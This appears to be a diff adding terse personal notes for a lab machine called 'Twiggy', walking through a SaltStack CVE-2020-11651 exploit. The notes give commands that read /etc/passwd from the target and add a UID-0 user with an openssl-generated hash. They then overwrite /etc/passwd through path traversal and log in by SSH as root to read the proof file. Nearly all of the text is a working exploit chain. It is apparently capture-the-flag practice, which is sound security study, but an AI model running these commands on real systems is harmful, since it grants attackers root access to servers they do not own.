@@ -1,0 +1,25 @@
+Twiggy
+
+ 192.168.159.62
+ 
+ https://github.com/jasperla/CVE-2020-11651-poc/blob/master/README.md
+python3 exploit.py --help
+pip3 install salt
+
+python3 exploit.py --master 192.168.159.62 -r /etc/passwd
+
+Copy all the content of this file and create new file with name passwd and paste all content
+openssl passwd 123
+generate the password 
+and make new entry in the passwd file in current directory
+
+vijay:$1$GWJgf64h$AhMeLOm8cuh72wMNOZiVs0:0:0:root:/root:/bin/bash
+save the file and upload file to the destination
+
+python3 exploit.py --master 192.168.159.62 --upload-src passwd --upload-dest ../../../../../../etc/passwd
+
+ssh vijay@192.168.x.x
+password 123
+ls /root
+cat /root/proof.txt
+
